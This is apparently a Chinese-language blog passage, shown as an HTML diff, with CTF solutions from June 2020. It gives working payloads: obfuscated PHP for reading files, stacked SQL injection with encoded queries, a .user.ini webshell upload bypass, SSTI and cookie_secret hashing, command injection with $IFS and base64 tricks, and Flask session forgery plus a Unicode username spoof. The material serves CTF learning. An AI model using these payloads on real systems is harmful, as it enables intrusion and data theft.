class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))))))</span><br></pre></td></tr></table></figure>
+
+<p>在根目录发现 flag 文件<code>f1agg</code>。<br> 最终 payload 构造：<code>(serIALIze)(FILe(/f1agg))</code>读取文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))))(((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))))(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;)|((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))).(((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">-2</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;)|(((<span class="number">-2</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;)|(((<span class="number">-2</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))))</span><br></pre></td></tr></table></figure>
+
+<p>注意最后发送的时候需要再 URLencode 一下。</p>
+<h3 id="3-强网杯-2019-随便注"><a href="#3-强网杯-2019-随便注" class="headerlink" title="3.[强网杯 2019]随便注"></a>3.[强网杯 2019]随便注</h3><p>推一波MrYunen师傅的<a href="https://xz.aliyun.com/t/7169#toc-47" target="_blank" rel="noopener">注入圣经</a></p>
+<p>尝试语句<code>1&#39; or 1=1 #</code>发现返回多个结果，说明存在注入</p>
+<p>接着 order by爆字段 发现就两个字段</p>
+<p>然后查询数据，有过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure>
+
+<p>这里可以利用堆叠注入，原理很简单，就是通过 ; 号注入多条SQL语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1'; <span class="keyword">show</span> <span class="keyword">databases</span>; <span class="comment">#</span></span><br><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br><span class="line">1'; <span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span>; <span class="comment">#  //表名是数字用反引号</span></span><br></pre></td></tr></table></figure>
+
+<p>flag就在这串数字表中</p>
+<ol>
+<li><p>通过编码绕过</p>
+<p> 因为select被过滤了，所以先将 select * from  `1919810931114514` 进行16进制编码再通过构造payload得</p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0';<span class="keyword">SeT</span>@a=<span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> @a;<span class="keyword">execute</span> execsql;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p> 当然也可以通过 <code>char()</code></p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0';<span class="keyword">set</span> @s=<span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">115</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">99</span>),<span class="built_in">char</span>(<span class="number">116</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">102</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">97</span>),<span class="built_in">char</span>(<span class="number">103</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">102</span>),<span class="built_in">char</span>(<span class="number">114</span>),<span class="built_in">char</span>(<span class="number">111</span>),<span class="built_in">char</span>(<span class="number">109</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">96</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">57</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">57</span>),<span class="built_in">char</span>(<span class="number">56</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">48</span>),<span class="built_in">char</span>(<span class="number">57</span>),<span class="built_in">char</span>(<span class="number">51</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">52</span>),<span class="built_in">char</span>(<span class="number">53</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">52</span>),<span class="built_in">char</span>(<span class="number">96</span>));<span class="keyword">PREPARE</span> a <span class="keyword">FROM</span> @s;<span class="keyword">EXECUTE</span> a;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>prepare…from…是预处理语句，会进行编码转换。</li>
+<li>execute用来执行由SQLPrepare创建的SQL语句。</li>
+<li>SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。</li>
+</ul>
+</li>
+<li><p>handler</p>
+<p> mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'; <span class="keyword">handler</span> <span class="string">`1919810931114514`</span> <span class="keyword">open</span> <span class="keyword">as</span> <span class="string">`a`</span>; <span class="keyword">handler</span> <span class="string">`a`</span> <span class="keyword">read</span> <span class="keyword">next</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h3 id="4-SUCTF-2019-CheckIn"><a href="#4-SUCTF-2019-CheckIn" class="headerlink" title="4.[SUCTF 2019]CheckIn"></a>4.[SUCTF 2019]CheckIn</h3><p>文件的内容不能包含<code>&lt;?</code>，但可以上传<code>&lt;script language=&#39;php&#39;&gt;&lt;scirpt&gt;</code>类型的图片马来绕过</p>
+<p>利用 <code>.user.ini</code>绕过,解析php</p>
+<p>利用前提</p>
+<ol>
+<li>服务器脚本语言为PHP</li>
+<li>服务器使用CGI／FastCGI模式</li>
+<li>上传目录下要有可执行的php文件</li>
+</ol>
+<p><img src="/2020/06/6月刷题记录/image-20200608004804065.png" alt="image-20200608004804065"></p>
+<p>关键在这两个关键字</p>
+<p><img src="/2020/06/6月刷题记录/image-20200608004839982.png" alt="image-20200608004839982"></p>
+<p><strong>auto_prepend_file</strong>是在文件前插入；<strong>auto_append_file</strong>在文件最后插入（当文件调用的有<code>exit()</code>时该设置无效）</p>
+<p>先上传 <code>.user.ini</code></p>
+<p><img src="/2020/06/6月刷题记录/image-20200608005009468.png" alt="image-20200608005009468"></p>
+<p>接着传马</p>
+<p><img src="/2020/06/6月刷题记录/image-20200608005047907.png" alt="image-20200608005047907"></p>
+<p>再去访问上传目录即可获得flag</p>
+<h3 id="5-护网杯-2018-easy-tornado"><a href="#5-护网杯-2018-easy-tornado" class="headerlink" title="5.[护网杯 2018]easy_tornado"></a>5.[护网杯 2018]easy_tornado</h3><p>flag.txt 提示flag在 <code>/fllllllllllllag</code> </p>
+<p>welcome.txt 的render 可能存在SSTI注入</p>
+<p>hints.txt 提示我们 filehash的加密格式 md5(cookie_secret+md5(filename))</p>
+<p>先直接访问 <code>/fllllllllllllag</code>  直接报错，看URL应该是SSTI注入</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/error?msg=&#123;&#123;<span class="number">2</span>^<span class="number">1</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接回显 <code>3</code> ，过滤了很多符号，命令执行就别想了</p>
+<p>说明确实存在注入。后面如何通过注入得到 cookie_secret实在是不知道</p>
+<p>大佬一句 阅读tornado源码</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/tornadoweb/</span>tornado<span class="regexp">/blob/m</span>aster<span class="regexp">/tornado/</span>auth.py</span><br></pre></td></tr></table></figure>
+
+<p>发现<code>handler.settings</code>存放了cookie_secret （ORZ</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">cookie_secret = <span class="string">'8bf1192d-691c-4345-8667-78a8a7899ff0'</span></span><br><span class="line">filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line">hash = hashlib.md5((cookie_secret + hashlib.md5(filename.encode()).hexdigest()).encode())</span><br><span class="line">print(hash.hexdigest())</span><br></pre></td></tr></table></figure>
+
+<p>构造下URL即可拿到flag</p>
+<h3 id="6-GXYCTF2019-Ping-Ping-Ping"><a href="#6-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="6.[GXYCTF2019]Ping Ping Ping"></a>6.[GXYCTF2019]Ping Ping Ping</h3><p>简单的命令注入</p>
+<p>直接用 <code>;</code>分割命令成功，直接执行 <code>ls</code>回显 <code>flag.php</code>和<code>index.php</code>接着读<code>index.php</code>发现过滤了空格用 <code>$IFS$9</code>绕过</p>
+<p>得到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your symbol!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/ /"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your space!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/bash/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your bash!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your flag!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我用的是base64绕过</p>
+<p>payload </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;`<span class="built_in">echo</span><span class="variable">$IFS</span><span class="variable">$9Y2F0IGZsYWcucGhwCg</span>==|base64<span class="variable">$IFS</span><span class="variable">$9</span>-d`</span><br></pre></td></tr></table></figure>
+
+<p>其他payload</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">cat</span><span class="variable">$IFS</span><span class="variable">$1</span>`<span class="keyword">ls</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment">// if(preg_match("/.*f.*l.*a.*g.*/", $ip))&#123;</span></span><br><span class="line"><span class="comment">//    die("fxck your flag!");</span></span><br><span class="line"><span class="comment">//匹配一个字符串中，是否按顺序出现过flag四个字母</span></span><br><span class="line">;a=<span class="keyword">g</span>;<span class="keyword">cat</span><span class="variable">$IFS</span><span class="variable">$1fla</span><span class="variable">$a</span>.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-HCTF-2018-admin"><a href="#7-HCTF-2018-admin" class="headerlink" title="7.[HCTF 2018]admin"></a>7.[HCTF 2018]admin</h3><p>在登录页面的注释中有一句</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- you are not admin --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>随便注册个账号进去，在改变密码的页面注释泄露github地址<a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask/</a></p>
+<p>在index.html中</p>
+<p><img src="/2020/06/6月刷题记录/image-20200622145001059.png" alt="image-20200622145001059"></p>
+<p>admin登录后得到flag</p>
+<p>这道题有两种解法</p>
+<ul>
+<li><p>session伪造</p>
+<p>  根据P师傅的<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">文章</a>，flask的session都是在本地的，通过一个SECRET_KEY进行签名,可以直接使用<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">脚本</a>进行加解密</p>
+  <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager<span class="number">3</span>.py decode -<span class="keyword">c</span> .eJxFUE<span class="number">2</span>LwjAU_CvLO<span class="number">3</span>uIFi-CB<span class="number">6E2</span>VHgvWFLDy<span class="number">0</span>VcrW<span class="number">3</span>axoW<span class="number">2</span>Ylvxv<span class="number">2</span>_Xhd<span class="number">3</span>DnGaYryccr<span class="number">03</span>WFrDqmns<span class="number">2</span>g<span class="number">6</span>O<span class="number">7</span>wOoJH<span class="number">5</span>-wAlzgkj<span class="number">0</span>LNFQrmRQqjAXrxOF<span class="number">4</span>FlZHzpZFhWFRsIk<span class="number">8</span>euvYpAPrNKCSfrRLJdOedT<span class="number">5</span>ajz<span class="number">3</span>Jg<span class="number">1</span>fhXqCO<span class="number">59</span>bwYP<span class="number">2</span>hVLoKUMYPkuR<span class="number">5</span>rAb<span class="number">2</span>SUmG<span class="number">52</span>xQqHDnUEbeSlzwuFnimAdWpsOE<span class="number">0</span>YYHN-XXrLlHiQMZXMNrBue<span class="number">2</span>uR<span class="number">67</span>ryq<span class="number">7</span>_U<span class="number">2</span>wfttbY<span class="number">2</span>vUG<span class="number">0</span>EyqaZaAZdFjT<span class="number">6</span>pyewXpPePqcZAeleRjAMVbgVt<span class="number">1</span>m<span class="number">8750959</span>n<span class="number">9</span>GZAXlv<span class="number">8</span>zt<span class="number">5</span>CcCuqztYAb<span class="number">3</span>Nmvet<span class="number">8</span>FcwOsb<span class="number">4</span>eJsVg.XvhXYA.DtOXFn-B-CxhrW<span class="number">07</span>nqEb<span class="number">1</span><span class="keyword">i9</span>eswM</span><br><span class="line"></span><br><span class="line">'&#123;<span class="string">"_fresh"</span>:True,<span class="string">"_id"</span>:b<span class="string">"3c9bf41ce8da824a4b374e1bf8d08aaaf2fbae2a5763a8298e1a83fc14ef844125ef2fec9970b04cfc92bdc5f5ac482b0afdc6c09387de2de3d5be1ea610c25c"</span>,<span class="string">"csrf_token"</span>:b<span class="string">"fa1efe1044dd827b8e2de5d654099252d4b78144"</span>,<span class="string">"image"</span>:b<span class="string">"0Vt6"</span>,<span class="string">"name"</span>:<span class="string">"admin"</span>,<span class="string">"user_id"</span>:<span class="string">"10"</span>&#125;'</span><br></pre></td></tr></table></figure>
+
+<p>  然后源码中有SECRET_KEY</p>
+<p>  <img src="/2020/06/6月刷题记录/image-20200622144648942.png" alt="image-20200622144648942"></p>
+  <figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -t "&#123;<span class="string">'_fresh'</span>: True,<span class="string">'_id'</span>: b<span class="string">'3c9bf41ce8da824a4b374e1bf8d08aaaf2fbae2a5763a8298e1a83fc14ef844125ef2fec9970b04cfc92bdc5f5ac482b0afdc6c09387de2de3d5be1ea610c25c'</span>,<span class="string">'csrf_token'</span>:b<span class="string">'fa1efe1044dd827b8e2de5d654099252d4b78144'</span>,<span class="string">'image'</span>:b<span class="string">'0Vt6'</span>,<span class="string">'name'</span>:<span class="string">'admin'</span>,<span class="string">'user_id'</span>:<span class="string">'10'</span>&#125;" -s ckj123</span><br><span class="line">.eJxFUE1rwkAQ_Stlzh5WgxfBgxCzRJgJho3L7EWsxmSTjIWomET8700ttId3eo_39YT9uc2vJSxu7T2fwN6fYPGEj09YAM5wzsIKLTWJTsskjBWb1ONwVM5E3lVljWFZso0ExXm2Wc8mC6iiH-080VnHphicYEd6J0m4VWjiqbPcO9lViakD1PGDNAkPdc-SVmR5yhZVEm486kicxhkPqzkOReB01o8YXLjzY37DhjvU2JPFJbwmcLy25_3tq84vfxOcrDtnXYNmpUin9Vgr4KpsUNKG7HZGZvsYa_RkNjXpOEjCtaLV8m3n5VDk_2dETlHxy1wOMhJwOIm_wATu17x9_wZTBa9vTipsnw.XvhesQ.opeFEuwbfnBJs_j3BEQR_eCGvXE</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<pre><code>用这个cookie访问 即可得到flag</code></pre><ul>
+<li><p>Unicode欺骗</p>
+<p>  源码中显示，各种操作前都会对用户名进行自定义的strlower</p>
+  <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span></span><span class="symbol">:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>
+
+<p>  nodeprep.prepare对应的库是Twisted，requirements.txt中显示Twisted==10.2.0</p>
+<p>  版本非常老。</p>
+<p>  unicode问题，对于一些特殊字符，nodeprep.prepare会进行如下操作</p>
+  <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴬ -&gt; A -&gt; a</span><br></pre></td></tr></table></figure>
+
+<p>  即第一次将其转换为大写，第二次将其转换为小写</p>
+<p>  那么，攻击链大概就这样</p>
+<ul>
+<li>注册用户ᴬdmin</li>
+<li>登录用户ᴬdmin，变成Admin</li>
+<li>修改密码Admin，更改了admin的密码</li>
+</ul>
+</li>
+</ul>
+<h3 id="8-DASCTF-六月赛-简单的计算题"><a href="#8-DASCTF-六月赛-简单的计算题" class="headerlink" title="8.[DASCTF 六月赛]简单的计算题"></a>8.<strong>[DASCTF 六月赛]简单的计算题</strong></h3><p>最开始的源码</p>
